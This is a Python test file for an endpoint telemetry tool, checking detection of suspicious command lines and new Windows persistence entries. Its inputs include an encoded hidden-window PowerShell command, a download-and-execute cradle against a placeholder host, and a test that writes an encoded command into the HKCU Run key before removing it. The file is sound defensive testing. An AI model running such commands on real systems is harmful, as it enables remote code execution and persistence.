"""Tests for expanded endpoint telemetry: process command-line heuristics and
the persistence (ASEP) collector.

Runs standalone (`python tests/test_endpoint_telemetry.py`) or under pytest.
Registry tests use a throwaway key under HKCU (always writable, cleaned up);
they self-skip on non-Windows.
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from valkyrie.process_telemetry import classify_cmdline, ProcInfo  # noqa: E402
from valkyrie.persistence_telemetry import (  # noqa: E402
    PersistenceCollector, _persistence_severity, _exe_from_command,
)
from valkyrie.telemetry import (  # noqa: E402
    CAT_PERSISTENCE, CAT_PROCESS, PERSIST_RUN_KEY, SEV_HIGH, SEV_MEDIUM,
    severity_rank,
)

_WINDOWS = os.name == "nt"


# ── command-line heuristics ─────────────────────────────────────────────────
def test_cmdline_encoded_powershell_is_high():
    sev, labels, reason = classify_cmdline(
        "powershell.exe", "powershell -nop -w hidden -enc SQBFAFgA")
    assert sev == SEV_HIGH
    assert "encoded_powershell" in labels
    assert "hidden_window" in labels


def test_cmdline_download_cradle_is_high():
    sev, labels, _ = classify_cmdline(
        "powershell.exe",
        "powershell IEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    assert sev == SEV_HIGH
    assert "download_cradle" in labels


def test_cmdline_benign_is_info():
    sev, labels, _ = classify_cmdline("chrome.exe", "chrome.exe --profile-directory=Default")
    assert severity_rank(sev) < severity_rank(SEV_MEDIUM)
    assert labels == []


def test_procinfo_event_carries_cmdline_and_chain():
    pi = ProcInfo(pid=1234, name="powershell.exe", path=r"C:\Windows\ps.exe",
                  ppid=10, parent_name="winword.exe",
                  cmdline="powershell -enc AAAA", parent_chain=("winword.exe", "explorer.exe"))
    ev = pi.to_event()
    assert ev.category == CAT_PROCESS
    assert ev.fields["cmdline"] == "powershell -enc AAAA"
    assert ev.fields["parent_chain"] == ["winword.exe", "explorer.exe"]
    # office parent + shell AND encoded cmdline → high
    assert ev.severity == SEV_HIGH
    assert "office_child_shell" in ev.labels and "encoded_powershell" in ev.labels


# ── persistence severity ────────────────────────────────────────────────────
def test_persistence_severity_baseline_medium():
    sev, labels, _ = _persistence_severity(PERSIST_RUN_KEY, r"C:\Program Files\App\app.exe")
    assert sev == SEV_MEDIUM
    assert "persistence_run_key" in labels


def test_persistence_severity_suspicious_command_high():
    sev, labels, _ = _persistence_severity(
        PERSIST_RUN_KEY, r"powershell -enc SQBFAFgA")
    assert sev == SEV_HIGH
    assert "encoded_powershell" in labels


def test_exe_from_command():
    assert _exe_from_command(r'"C:\Windows\System32\svchost.exe" -k netsvcs') == "svchost.exe"
    assert _exe_from_command(r"C:\tmp\evil.exe /q") == "evil.exe"
    assert _exe_from_command("") == ""


# ── persistence collector: real baseline+diff via a temp HKCU Run value ─────
def test_persistence_collector_detects_new_run_key():
    if not _WINDOWS:
        print("  SKIP (non-Windows)")
        return
    import winreg
    events = []
    coll = PersistenceCollector(emit=events.append, interval=60)
    # Baseline first (captures existing Run values).
    coll._last = coll.snapshot()

    run = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    marker = "ValkyrieTest_DELETEME"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run, 0, winreg.KEY_SET_VALUE)
    try:
        winreg.SetValueEx(key, marker, 0, winreg.REG_SZ,
                          r"powershell -enc SQBFAFgA")
        winreg.CloseKey(key)
        n = coll.poll_once()
        assert n >= 1, "new Run value not detected"
        persist = [e for e in events if e.category == CAT_PERSISTENCE]
        assert persist, "no persistence event emitted"
        ev = next(e for e in persist if marker in e.target.get("location", ""))
        assert ev.activity == PERSIST_RUN_KEY
        assert ev.severity == SEV_HIGH        # encoded PS command escalates
        assert "encoded_powershell" in ev.labels
    finally:
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(k, marker)
            winreg.CloseKey(k)
        except OSError:
            pass


def test_persistence_collector_detects_startup_file(tmp_path=None):
    # Uses the collector's diff logic directly with a synthetic snapshot so it is
    # deterministic and cross-platform (no real startup folder writes).
    events = []
    coll = PersistenceCollector(emit=events.append)
    from valkyrie.telemetry import PERSIST_STARTUP_FOLDER
    coll._last = {PERSIST_RUN_KEY: {}, "service_install": {},
                  "scheduled_task": {}, PERSIST_STARTUP_FOLDER: {}}

    def fake_snapshot():
        s = {PERSIST_RUN_KEY: {}, "service_install": {}, "scheduled_task": {},
             PERSIST_STARTUP_FOLDER: {r"C:\...\Startup\evil.exe": r"C:\...\Startup\evil.exe"}}
        return s
    coll.snapshot = fake_snapshot  # type: ignore
    n = coll.poll_once()
    assert n == 1
    assert events[0].activity == PERSIST_STARTUP_FOLDER


def test_first_poll_is_silent_baseline():
    coll = PersistenceCollector(emit=lambda e: (_ for _ in ()).throw(AssertionError("emitted on baseline")))
    # _last is None → first poll only baselines, emits nothing.
    assert coll.poll_once() == 0


# ── benchmark ───────────────────────────────────────────────────────────────
def test_persistence_snapshot_is_reasonable():
    if not _WINDOWS:
        print("  SKIP (non-Windows)")
        return
    import time
    coll = PersistenceCollector(emit=lambda e: None)
    t0 = time.perf_counter()
    snap = coll.snapshot()
    elapsed = time.perf_counter() - t0
    total = sum(len(v) for v in snap.values())
    print(f"    [bench] snapshot {total} ASEP entries in {elapsed*1000:.1f} ms")
    # A full ASEP snapshot (incl. every service) must be well under 2s.
    assert elapsed < 2.0, f"persistence snapshot too slow: {elapsed:.2f}s"


# ── standalone runner ───────────────────────────────────────────────────────
if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for t in tests:
        try:
            t()
            print(f"  PASS  {t.__name__}")
        except Exception as e:  # noqa: BLE001
            failed += 1
            print(f"  FAIL  {t.__name__}: {e}")
    print(f"\n{len(tests) - failed}/{len(tests)} passed")
    sys.exit(1 if failed else 0)
